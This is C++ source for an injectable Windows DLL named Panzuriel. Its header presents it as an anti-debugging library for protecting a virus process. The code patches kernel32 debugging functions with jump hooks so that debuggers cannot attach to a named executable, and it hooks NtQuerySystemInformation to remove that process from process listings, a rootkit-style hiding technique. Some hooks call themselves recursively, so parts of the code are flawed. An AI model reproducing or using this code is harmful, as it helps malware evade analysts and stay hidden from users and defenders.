// Panzuriel.cpp : Defines the entry point for the DLL application.
//

/*
   
Description:	
   Panzuriel Anti-Debugging library.
   This DLL, once injected into a process will hook several important and commonly used
   debugging APIs, effectively hiding from and defending itself against them. It also hooks
   NtQuerySystemInformation, the root Native API to Process information functions (like Process32First) to hide
   the viral process specefied by PNametoProtect.
Disclaimer:
   The author is in no way responsible for any damage done by this code and/or anything remotely related, neither for
   the usage in a virus. This Library may in NO way be used in a commercial application without the author's explicit written
   premission. For the rest, it's distributed under the GPL.

   -Nomenumbra- 
*/

#include "stdafx.h"
#include <cstdlib>
#include <windows.h>
#include <tlhelp32.h>

/* Some structs */

typedef struct _UNICODE_STRING {
  USHORT  Length;
  USHORT  MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING ,*PUNICODE_STRING;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID;

typedef LONG KPRIORITY;

typedef struct _SYSTEM_THREAD_INFORMATION {
    LARGE_INTEGER KernelTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER CreateTime;
    ULONG WaitTime;
    PVOID StartAddress;
    CLIENT_ID ClientId;
    KPRIORITY Priority;
    LONG BasePriority;
    ULONG ContextSwitches;
    ULONG ThreadState;
    ULONG WaitReason;
} SYSTEM_THREAD_INFORMATION, *PSYSTEM_THREAD_INFORMATION;



typedef struct _SYSTEM_PROCESS_INFORMATION 
{ 
    DWORD          NextEntryDelta; 
    DWORD          dThreadCount; 
    DWORD          dReserved01; 
    DWORD          dReserved02; 
    DWORD          dReserved03; 
    DWORD          dReserved04; 
    DWORD          dReserved05; 
    DWORD          dReserved06; 
    FILETIME       ftCreateTime;	/* relative to 01-01-1601 */ 
    FILETIME       ftUserTime;		/* 100 nsec units */ 
    FILETIME       ftKernelTime;	/* 100 nsec units */ 
    UNICODE_STRING ProcessName; 
    DWORD          BasePriority; 
    DWORD          dUniqueProcessId; 
    DWORD          dParentProcessID; 
    DWORD          dHandleCount; 
    DWORD          dReserved07; 
    DWORD          dReserved08; 
    DWORD          VmCounters; 
    DWORD          dCommitCharge; 
    SYSTEM_THREAD_INFORMATION  ThreadInfos[1];
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;

/*
NtQuerySystemInformation prototype (for address resolving)
*/
typedef DWORD (CALLBACK* NQI)(DWORD,PVOID,ULONG,PULONG);
NQI NtQuerySystemInformation;


BOOL WINAPI DebugActiveProcesshook(DWORD dwProcessId);

BOOL WINAPI ContinueDebugEventhook(DWORD dwProcessId,DWORD dwThreadId, DWORD dwContinueStatus);

VOID WINAPI DebugBreakhook(VOID);

BOOL WINAPI DebugBreakProcesshook(HANDLE Process);

BOOL WINAPI DebugSetProcessKillOnExithook(BOOL KillOnExit);

DWORD WINAPI NtQuerySystemInformationHOOK(DWORD SystemInformationClass,PVOID SystemInformation, ULONG SystemInformationLength,PULONG ReturnLength);


DWORD DebugActiveProcessAddr=0;
BYTE DebugActiveProcessBackup[6];

DWORD ContinueDebugEventAddr = 0;
BYTE ContinueDebugEventBackup[6];

DWORD DebugBreakAddr = 0;
BYTE DebugBreakBackup[6];

DWORD DebugBreakProcessAddr = 0;
BYTE DebugBreakProcessBackup[6];

DWORD DebugSetProcessKillOnExitAddr = 0;
BYTE DebugSetProcessKillOnExitBackup[6];

DWORD NtQuerySystemInformationAddr=0;
BYTE NQIBackup[6];

char* PNametoProtect = "Panzuriel.exe";

//this will hook a process and all of it's modules (loaded DLLs)
//the DETOURS way
DWORD HookGeneralFunction(const char *Dll, const char *FuncName, void *Function, unsigned char *backup)
{
	DWORD addr = (DWORD)GetProcAddress(GetModuleHandle(Dll), FuncName); // Fetch function's address
	BYTE jmp[6] = { 0xe9,			//jmp
		0x00, 0x00, 0x00, 0x00,		//address
		0xc3 };						//retn
	ReadProcessMemory(GetCurrentProcess(), (void*)addr, backup, 6, 0); // Read 6 bytes from address of hooked function from rooted process into backup
    DWORD calc = ((DWORD)Function - addr - 5); //((to)-(from)-5)	
	memcpy(&jmp[1], &calc, 4); //build the jmp
	WriteProcessMemory(GetCurrentProcess(), (void*)addr, jmp, 6, 0); // write the 6 bytes long jump to address of hooked function to current process
	return addr;
}

// simple function to retrieve process ID by name

DWORD GetProcessIdByName(char* PName) {
	// remember to unhook this, because else we'll be fooled!
	WriteProcessMemory(GetCurrentProcess(), (void*)NtQuerySystemInformationAddr, NQIBackup, 6, 0);					
    PROCESSENTRY32 pe32;
    HANDLE HandleProcessSnap;
    int rProcessFound;  
   	HandleProcessSnap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // snap the handle like a picture
   	if (HandleProcessSnap == INVALID_HANDLE_VALUE)
	{
	  NtQuerySystemInformationAddr = HookGeneralFunction("ntdll.dll","NtQuerySystemInformation",NtQuerySystemInformationHOOK,NQIBackup);	// re-hook
      return 0;
	}
   	pe32.dwSize=sizeof(pe32); // set size
    rProcessFound=Process32First(HandleProcessSnap,&pe32);
   	do {
         if(strcmp(pe32.szExeFile,PName) == 0)
		 {
		   NtQuerySystemInformationAddr = HookGeneralFunction("ntdll.dll","NtQuerySystemInformation",NtQuerySystemInformationHOOK,NQIBackup);	// re-hook
           return pe32.th32ProcessID;
		 }
   	}while (rProcessFound=Process32Next(HandleProcessSnap,&pe32));
   	CloseHandle(HandleProcessSnap);
    NtQuerySystemInformationAddr = HookGeneralFunction("ntdll.dll","NtQuerySystemInformation",NtQuerySystemInformationHOOK,NQIBackup);	 // re-hook
   	return 0;
}

bool ResolveNQI() // resolve function
{  
  HINSTANCE hDLL = LoadLibrary("ntdll.dll");
	if (hDLL)
	{
	  NtQuerySystemInformation = (NQI)GetProcAddress(hDLL,"NtQuerySystemInformation");
	  if (!NtQuerySystemInformation)
	  {
	    FreeLibrary(hDLL);       
		return false;
	  }
	  else
	  {
        FreeLibrary(hDLL);
		return true;
	  }
	}
	else
	{
	  FreeLibrary(hDLL);
	  return false;
	}
}

BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{

	switch (ul_reason_for_call)
	{
	  case DLL_PROCESS_ATTACH:
		  {

            DebugActiveProcessAddr = HookGeneralFunction("kernel32.dll", "DebugActiveProcess",DebugActiveProcesshook, DebugActiveProcessBackup);
			ContinueDebugEventAddr = HookGeneralFunction("kernel32.dll","ContinueDebugEvent",ContinueDebugEventhook,ContinueDebugEventBackup);
			DebugBreakAddr = HookGeneralFunction("kernel32.dll","DebugBreak",DebugBreakhook,DebugBreakBackup);
			DebugBreakProcessAddr = HookGeneralFunction("kernel32.dll","DebugBreakProcess",DebugBreakProcesshook,DebugBreakProcessBackup);
			DebugSetProcessKillOnExitAddr = HookGeneralFunction("kernel32.dll","DebugSetProcessKillOnExit",DebugSetProcessKillOnExithook,DebugSetProcessKillOnExitBackup);
			if(ResolveNQI()) // did we resolve it? Yes -> hook it				  
              NtQuerySystemInformationAddr = HookGeneralFunction("ntdll.dll","NtQuerySystemInformation",NtQuerySystemInformationHOOK,NQIBackup);		
		  }
	  case DLL_PROCESS_DETACH:
		  {			
		    if(DebugActiveProcessAddr)
		      WriteProcessMemory(GetCurrentProcess(), (void*)DebugActiveProcessAddr, DebugActiveProcessBackup, 6, 0);
			if(ContinueDebugEventAddr)
			  WriteProcessMemory(GetCurrentProcess(),(void*)ContinueDebugEventAddr,ContinueDebugEventBackup,6,0);
			if(DebugBreakAddr)
			  WriteProcessMemory(GetCurrentProcess(),(void*)DebugBreakAddr,DebugBreakBackup,6,0);
			if(DebugBreakProcessAddr)
			  WriteProcessMemory(GetCurrentProcess(),(void*)DebugBreakProcessAddr,DebugBreakProcessBackup,6,0);
			if(DebugSetProcessKillOnExitAddr)
			  WriteProcessMemory(GetCurrentProcess(),(void*)DebugSetProcessKillOnExitAddr,DebugSetProcessKillOnExitBackup,6,0);
			if(NtQuerySystemInformationAddr)
	          WriteProcessMemory(GetCurrentProcess(), (void*)NtQuerySystemInformationAddr, NQIBackup, 6, 0);					
		  }
	}
    
    return TRUE;
}

BOOL WINAPI DebugActiveProcesshook(DWORD dwProcessId)
{
  WriteProcessMemory(GetCurrentProcess(), (void*)DebugActiveProcessAddr, DebugActiveProcessBackup, 6, 0); // temp unhook
  BOOL RetVal;
  if(dwProcessId == GetProcessIdByName(PNametoProtect))
  {
    SetLastError(0xDEADBEEF); // phun for the smartypants who want the last error
	RetVal = false;
  }
  else
    RetVal = DebugActiveProcess(dwProcessId);  
  DebugActiveProcessAddr = HookGeneralFunction("kernel32.dll", "DebugActiveProcess",DebugActiveProcesshook, DebugActiveProcessBackup);// re-hook
  return RetVal;
}

BOOL WINAPI ContinueDebugEventhook(DWORD dwProcessId,DWORD dwThreadId, DWORD dwContinueStatus)
{
  WriteProcessMemory(GetCurrentProcess(),(void*)ContinueDebugEventAddr,ContinueDebugEventBackup,6,0);
  BOOL Retval;
  if(dwProcessId == GetProcessIdByName(PNametoProtect))
  {
    SetLastError(0xDEADBEEF); // phun for the smartypants who want the last error
	Retval = false;
  }
  else
	Retval = ContinueDebugEventhook(dwProcessId,dwThreadId,dwContinueStatus);
  ContinueDebugEventAddr = HookGeneralFunction("kernel32.dll","ContinueDebugEvent",ContinueDebugEventhook,ContinueDebugEventBackup);
  return Retval;
}

VOID WINAPI DebugBreakhook(VOID)
{
  WriteProcessMemory(GetCurrentProcess(),(void*)DebugBreakAddr,DebugBreakBackup,6,0);
  if(GetCurrentProcessId() != GetProcessIdByName(PNametoProtect)) // don't break if this process (having a breakpoint set) is the process to be protected  
    DebugBreak();
  DebugBreakAddr = HookGeneralFunction("kernel32.dll","DebugBreak",DebugBreakhook,DebugBreakBackup);
  return;
}

BOOL WINAPI DebugBreakProcesshook(HANDLE Process)
{
  WriteProcessMemory(GetCurrentProcess(),(void*)DebugBreakProcessAddr,DebugBreakProcessBackup,6,0);
  BOOL RetVal;
  if(GetProcessId(Process) == GetProcessIdByName(PNametoProtect))
  {
	SetLastError(0xDEADBEEF); // phun for the smartypants who want the last error
    RetVal = false;
  }
  else
    RetVal = DebugBreakProcesshook(Process);
  DebugBreakProcessAddr = HookGeneralFunction("kernel32.dll","DebugBreakProcess",DebugBreakProcesshook,DebugBreakProcessBackup);
  return RetVal;
}

BOOL WINAPI DebugSetProcessKillOnExithook(BOOL KillOnExit)
{
  WriteProcessMemory(GetCurrentProcess(),(void*)DebugSetProcessKillOnExitAddr,DebugSetProcessKillOnExitBackup,6,0);
  BOOL RetVal;
  if(GetCurrentProcessId() != GetProcessIdByName(PNametoProtect))
    RetVal = DebugSetProcessKillOnExit(KillOnExit);
  else
	RetVal = false;
  DebugSetProcessKillOnExitAddr = HookGeneralFunction("kernel32.dll","DebugSetProcessKillOnExit",DebugSetProcessKillOnExithook,DebugSetProcessKillOnExitBackup);
  return RetVal;
}

DWORD WINAPI NtQuerySystemInformationHOOK(DWORD SystemInformationClass,PVOID SystemInformation, ULONG SystemInformationLength,PULONG ReturnLength)
{
  //unhook
  WriteProcessMemory(GetCurrentProcess(), (void*)NtQuerySystemInformationAddr, NQIBackup, 6, 0);					
  PSYSTEM_PROCESS_INFORMATION pSpiCurrent, pSpiPrec;
  char *pname = NULL;	
  DWORD rc = NtQuerySystemInformation(SystemInformationClass,SystemInformation, SystemInformationLength, ReturnLength);	
	// Success? 
	if (rc == 0)
	{	 
		switch (SystemInformationClass)// querying for processes?
		{
			case 5:	//SystemProcessInformation
		pSpiCurrent = pSpiPrec = (PSYSTEM_PROCESS_INFORMATION) SystemInformation; 
			
			while (1)
			{	
				// allocate memory to save process name in AINSI 				 
				pname = (char *) GlobalAlloc(GMEM_ZEROINIT,pSpiCurrent->ProcessName.Length + 2);								
				// Convert unicode string to ansi 
				WideCharToMultiByte(CP_ACP, 0, 
				    pSpiCurrent->ProcessName.Buffer, 
				    pSpiCurrent->ProcessName.Length + 1, 
				    pname, pSpiCurrent->ProcessName.Length + 1,
				    NULL, NULL);
				    // if process is hidden
				if(!_stricmp((char*)pname, PNametoProtect))				     
				{					
					if (pSpiCurrent->NextEntryDelta == 0) 
					{							
					    pSpiPrec->NextEntryDelta = 0;
						break;
					}
					else 
					{
						pSpiPrec->NextEntryDelta += 
						      pSpiCurrent->NextEntryDelta; // add deltas
						
						pSpiCurrent = 
						(PSYSTEM_PROCESS_INFORMATION) ((PCHAR) 
						pSpiCurrent + 
						pSpiCurrent->NextEntryDelta);
					}
				}
				else
				{
					if (pSpiCurrent->NextEntryDelta == 0) break;
					pSpiPrec = pSpiCurrent;
					// Walk the list 
					pSpiCurrent = (PSYSTEM_PROCESS_INFORMATION) 
					((PCHAR) pSpiCurrent + 
					pSpiCurrent->NextEntryDelta);
				}
				
				GlobalFree(pname);
			}
			break;
		}
	}
	NtQuerySystemInformationAddr = HookGeneralFunction("ntdll.dll","NtQuerySystemInformation",NtQuerySystemInformationHOOK,NQIBackup);	
	return (rc);
}

